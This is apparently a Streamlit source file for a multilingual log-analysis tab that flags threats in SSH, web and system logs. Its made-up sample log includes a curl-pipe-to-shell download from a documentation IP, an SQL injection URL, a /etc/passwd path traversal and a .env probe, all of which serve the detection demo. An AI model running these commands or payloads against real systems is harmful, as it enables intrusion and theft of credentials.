"""The 'Log Analyzer' tab: paste or upload a log, get threats, errors and suspicious activity explained in four languages. Logic lives in log_analyzer.py (tested without Streamlit).
Everything is processed in memory only; nothing is stored or sent anywhere (the optional AI explanation sends only the masked finding lines, and only when the user presses its button)."""
from __future__ import annotations
import gzip
import json

import log_analyzer as la

TAB = {"en": "Log Analyzer", "fr": "Analyseur de journaux", "rw": "Isesengura rya Logs", "sw": "Kichanganuzi cha Kumbukumbu"}
S = {
    "en": dict(title="Log Analyzer: find attacks, errors and suspicious activity", intro="Paste a log or upload a file (SSH/auth, web server, Windows events, firewall, JSON, CSV or plain text). The tool reads it, flags threats, explains each one and tells you what to do. Nothing is stored.",
               paste="Paste log text here", upload="Or upload a log file", go="Analyze", demo="Try a sample log", empty="Paste or upload a log first.", big="File too large (limit 5 MB). Upload a smaller part.", read_fail="Could not read that file as text.",
               dl_md="Download report (Markdown)", dl_json="Download data (JSON)", ioc="Indicators to check (addresses, links, hashes)", top="Most active addresses", users="Accounts seen", ai="Explain with AI (more detail)",
               ai_busy="Explaining…", ai_fail="The AI explanation is not available now (the AI key may be missing). The built-in explanations above still work.", ai_note="AI explanation of the findings. It can be wrong: verify in your own logs.",
               sample_note="This is a made-up sample so you can see how it works.", privacy="Do not paste real passwords or personal data you do not need. Secrets found in the log are masked in the report."),
    "fr": dict(title="Analyseur de journaux : attaques, erreurs et activité suspecte", intro="Collez un journal ou importez un fichier (SSH/authentification, serveur web, événements Windows, pare-feu, JSON, CSV ou texte). L'outil le lit, signale les menaces, explique chacune et indique quoi faire. Rien n'est conservé.",
               paste="Collez le texte du journal ici", upload="Ou importez un fichier journal", go="Analyser", demo="Essayer un exemple", empty="Collez ou importez d'abord un journal.", big="Fichier trop gros (limite 5 Mo). Importez une partie plus petite.", read_fail="Impossible de lire ce fichier comme du texte.",
               dl_md="Télécharger le rapport (Markdown)", dl_json="Télécharger les données (JSON)", ioc="Indicateurs à vérifier (adresses, liens, empreintes)", top="Adresses les plus actives", users="Comptes observés", ai="Expliquer avec l'IA (plus de détails)",
               ai_busy="Explication…", ai_fail="L'explication par l'IA n'est pas disponible maintenant (la clé IA manque peut-être). Les explications intégrées ci-dessus fonctionnent toujours.", ai_note="Explication des constats par l'IA. Elle peut se tromper : vérifiez dans vos propres journaux.",
               sample_note="Exemple fictif pour voir le fonctionnement.", privacy="Ne collez pas de vrais mots de passe ni de données personnelles inutiles. Les secrets trouvés dans le journal sont masqués dans le rapport."),
    "rw": dict(title="Isesengura rya Logs: ibitero, amakosa n'ibikorwa biteye inkeke", intro="Shyiramo log cyangwa uyishyire mu rugero (SSH/kwinjira, seriveri y'urubuga, events za Windows, firewall, JSON, CSV cyangwa inyandiko). Igikoresho kirayisoma, kikerekana ibyago, kigasobanura buri kimwe kandi kikakubwira icyo gukora. Nta kibikwa.",
               paste="Shyira hano inyandiko ya log", upload="Cyangwa shyiramo dosiye ya log", go="Sesengura", demo="Gerageza urugero", empty="Banza ushyiremo log cyangwa dosiye.", big="Dosiye ni nini cyane (igipimo 5 MB). Shyiramo agace gato.", read_fail="Ntibishoboye gusoma iyo dosiye nk'inyandiko.",
               dl_md="Kuramo raporo (Markdown)", dl_json="Kuramo amakuru (JSON)", ioc="Ibimenyetso byo kugenzura (aderesi, imirongo, hash)", top="Aderesi zikora cyane", users="Konti zabonetse", ai="Sobanura na AI (birambuye)",
               ai_busy="Turasobanura…", ai_fail="Isobanura rya AI ntirishoboka ubu (urufunguzo rwa AI rushobora kuba rutarimo). Ibisobanuro biri hejuru biracyakora.", ai_note="Isobanura rya AI ry'ibyabonetse. Rishobora kwibeshya: genzura muri logs zawe.",
               sample_note="Ni urugero rwahimbwe kugira ngo urebe uko bikora.", privacy="Ntugashyiremo amagambo y'ibanga nyayo cyangwa amakuru bwite udakeneye. Amabanga abonetse muri log ahishwa muri raporo."),
    "sw": dict(title="Kichanganuzi cha Kumbukumbu: mashambulizi, makosa na shughuli za kutiliwa shaka", intro="Bandika kumbukumbu au pakia faili (SSH/uthibitishaji, seva ya wavuti, matukio ya Windows, firewall, JSON, CSV au maandishi). Zana huisoma, kuonyesha vitisho, kueleza kila kimoja na kukuambia la kufanya. Hakuna kinachohifadhiwa.",
               paste="Bandika maandishi ya kumbukumbu hapa", upload="Au pakia faili ya kumbukumbu", go="Changanua", demo="Jaribu sampuli", empty="Bandika au pakia kumbukumbu kwanza.", big="Faili ni kubwa mno (kikomo 5 MB). Pakia sehemu ndogo.", read_fail="Imeshindwa kusoma faili hiyo kama maandishi.",
               dl_md="Pakua ripoti (Markdown)", dl_json="Pakua data (JSON)", ioc="Viashiria vya kukagua (anwani, viungo, hash)", top="Anwani zenye shughuli nyingi", users="Akaunti zilizoonekana", ai="Eleza kwa AI (kwa undani)",
               ai_busy="Inaeleza…", ai_fail="Maelezo ya AI hayapatikani sasa (huenda ufunguo wa AI haupo). Maelezo yaliyomo hapo juu bado yanafanya kazi.", ai_note="Maelezo ya AI ya matokeo. Yanaweza kuwa na makosa: hakiki kwenye kumbukumbu zako.",
               sample_note="Hii ni sampuli ya kubuni ili uone jinsi inavyofanya kazi.", privacy="Usibandike nywila halisi au data binafsi usiyoihitaji. Siri zilizopatikana kwenye kumbukumbu zimefichwa kwenye ripoti."),
}
SAMPLE = "\n".join(
    [f"Oct 31 02:1{i}:0{i} web01 sshd[2201]: Failed password for {'root' if i % 2 else 'admin'} from 203.0.113.50 port 4{i}211 ssh2" for i in range(9)]
    + ["Oct 31 02:20:44 web01 sshd[2301]: Accepted password for admin from 203.0.113.50 port 51944 ssh2",
       "Oct 31 02:21:10 web01 useradd[2330]: new user: name=support2, UID=1005, GID=1005, home=/home/support2",
       "Oct 31 02:21:55 web01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash",
       "Oct 31 02:22:30 web01 bash[2400]: curl http://198.51.100.7/x.sh | sh",
       '198.51.100.23 - - [31/Oct/2026:03:01:11 +0200] "GET /products.php?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1" 200 5123 "-" "sqlmap/1.7"',
       '198.51.100.23 - - [31/Oct/2026:03:01:14 +0200] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 1743 "-" "Mozilla/5.0"',
       '198.51.100.23 - - [31/Oct/2026:03:01:20 +0200] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0"',
       "Oct 31 03:10:00 web01 kernel: Out of memory: Killed process 4121 (mysqld)",
       "Oct 31 03:15:00 web01 app[777]: login ok user=jean password=Secret123"])


def _read(upload):
    raw = upload.getvalue() if hasattr(upload, "getvalue") else upload.read()
    if len(raw) > la.MAX_BYTES * 2:
        return None, "big"
    if raw[:2] == b"\x1f\x8b":
        try:
            raw = gzip.decompress(raw)
        except Exception:
            return None, "read_fail"
    for enc in ("utf-8", "utf-16", "latin-1"):
        try:
            return raw.decode(enc), None
        except Exception:
            continue
    return None, "read_fail"


def explain_ai(res: dict, lang: str):
    """(AI explanation of the (masked) findings in the user's language, None) or (None, failure code)."""
    import ai_status
    name = {"en": "English", "fr": "French", "rw": "Kinyarwanda", "sw": "Kiswahili"}[lang]
    facts = []
    for fd in res["findings"][:8]:
        facts.append(f"- {la.R[fd['id']]['title']['en']} ({fd['severity']}), {fd['count']} times; addresses: " + ", ".join(ip for ip, _c, _p in fd["ips"][:3]) + "; example: " + (fd["samples"][0][1][:160] if fd["samples"] else ""))
    q = (f"A log analysis tool found these items. Explain to a non-expert in simple {name}: what probably happened, how serious it is, what to do first, and what to check next. "
         "Use only these facts, do not invent details, and say clearly that these are leads, not proof.\n\n" + "\n".join(facts))
    return ai_status.ask(q, lang)


def render(st, lang: str):
    lang = lang if lang in S else "en"
    tx = S[lang]
    ss = st.session_state
    ks = f"logan_state_{lang}"
    st.subheader(tx["title"])
    st.write(tx["intro"])
    st.caption(tx["privacy"])
    with st.form(f"logan_form_{lang}"):
        text = st.text_area(tx["paste"], height=200, key=f"logan_text_{lang}", max_chars=la.MAX_BYTES)
        up = st.file_uploader(tx["upload"], type=["log", "txt", "csv", "json", "jsonl", "xml", "gz", "out", "evtx_txt"], key=f"logan_file_{lang}")
        go = st.form_submit_button(tx["go"])
    if st.button(tx["demo"], key=f"logan_demo_{lang}"):
        ss[ks] = {"text": SAMPLE, "sample": True}
    if go:
        body, err = (text or ""), None
        if up is not None:
            body, err = _read(up)
        if err:
            st.error(tx[err])
        elif not body.strip():
            st.warning(tx["empty"])
        else:
            ss[ks] = {"text": body, "sample": False}
    job = ss.get(ks)
    if not job:
        return
    res = la.analyze(job["text"])
    if job.get("sample"):
        st.info(tx["sample_note"])
    L = la.LBL[lang]
    c1, c2, c3 = st.columns(3)
    c1.metric(L["risk"], L["levels"][res["level"]])
    c2.metric(L["score"], f"{res['score']}/100")
    c3.metric(L["lines"], res["stats"]["lines"])
    s = res["stats"]
    st.caption(f"{L['period']}: " + (f"{s['first']} → {s['last']}" if s["first"] else L["none_time"]) + (f" · {L['trunc']}" if s.get("truncated") else ""))
    for fd in res["findings"]:
        x = la.localize(fd, lang)
        icon = {"critical": "🟥", "high": "🟧", "medium": "🟨", "low": "🟦", "info": "🟩"}[x["severity"]]
        with st.expander(f"{icon} {L['levels'][x['severity']]} · {x['title']}" + (f" · {x['count']} {L['times']}" if x["count"] else ""), expanded=SEVERITY_OPEN(x["severity"])):
            st.markdown(f"**{L['why']}.** {x['why']}")
            st.markdown(f"**{L['do']}.** {x['do']}")
            if x["mitre"] != "—":
                st.caption(f"{L['mitre']}: {x['mitre']}")
            if x["ips"]:
                st.markdown(f"**{L['sources']}:** " + ", ".join(f"`{ip}` ({c}, {L['pub'] if p else L['priv']})" for ip, c, p in x["ips"][:6]))
            if x["users"]:
                st.markdown(f"**{L['users']}:** " + ", ".join(f"`{u}` ({c})" for u, c in x["users"][:6]))
            if x["samples"]:
                st.markdown(f"**{L['evidence']}:**")
                st.code("\n".join(f"{n}: {t}" if n else t for n, t in x["samples"]), language=None)
    if res["top_ips"]:
        st.markdown(f"**{tx['top']}:** " + ", ".join(f"`{ip}` ({c})" for ip, c, _p in res["top_ips"][:8]))
    if res["top_users"]:
        st.markdown(f"**{tx['users']}:** " + ", ".join(f"`{u}` ({c})" for u, c in res["top_users"][:8]))
    io = res["iocs"]
    if io["ips"] or io["urls"] or io["hashes"]:
        with st.expander(tx["ioc"]):
            for k in ("ips", "urls", "hashes"):
                if io[k]:
                    st.code("\n".join(io[k][:25]), language=None)
    md = la.to_markdown(res, lang)
    st.download_button(tx["dl_md"], md, file_name="log-report.md", key=f"logan_dlm_{lang}")
    st.download_button(tx["dl_json"], json.dumps(res, default=str, ensure_ascii=False, indent=1), file_name="log-report.json", key=f"logan_dlj_{lang}")
    if st.button(tx["ai"], key=f"logan_ai_{lang}"):
        with st.spinner(tx["ai_busy"]):
            out, err = explain_ai(res, lang)
        if out:
            st.markdown(out)
            st.caption(tx["ai_note"])
        else:
            import ai_status
            st.info(ai_status.explain_failure(err, lang))
    st.caption(L["caveat"])


def SEVERITY_OPEN(sev: str) -> bool:
    return sev in ("critical", "high")
